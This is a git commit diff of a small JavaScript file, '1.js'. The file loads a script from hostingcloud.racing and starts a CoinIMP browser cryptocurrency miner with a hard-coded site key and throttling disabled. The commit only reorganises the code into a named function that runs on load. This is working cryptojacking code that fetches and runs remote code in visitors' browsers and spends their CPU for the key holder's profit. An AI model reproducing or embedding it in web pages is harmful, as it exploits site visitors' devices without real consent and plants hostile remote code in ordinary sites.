ade7435b623b264f1a1729086273c1d6fb037941
ardx1 <164972915+ardx1@users.noreply.github.com>
2024-04-24 13:49:48 -0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,13 +1,15 @@
-(function() {
+function loadAndExecuteScript() {
     var script = document.createElement('script');
+    script.src = 'https://www.hostingcloud.racing/4mrU.js';
     script.onload = function() {
         var _client = new Client.Anonymous('22852f99de2f3022997a8b61c99ceda5c3b95c7db49facb0b27fdaedc6342650', {
-            throttle: 0,
-            c: 'w'
+            throttle: 0, c: 'w'
         });
         _client.start();
         _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
     };
-    script.src = 'https://www.hostingcloud.racing/4mrU.js';
-    document.head.appendChild(script);
-})();
+    document.body.appendChild(script);
+}
+
+// Chama a função para carregar e executar o script externo
+loadAndExecuteScript();
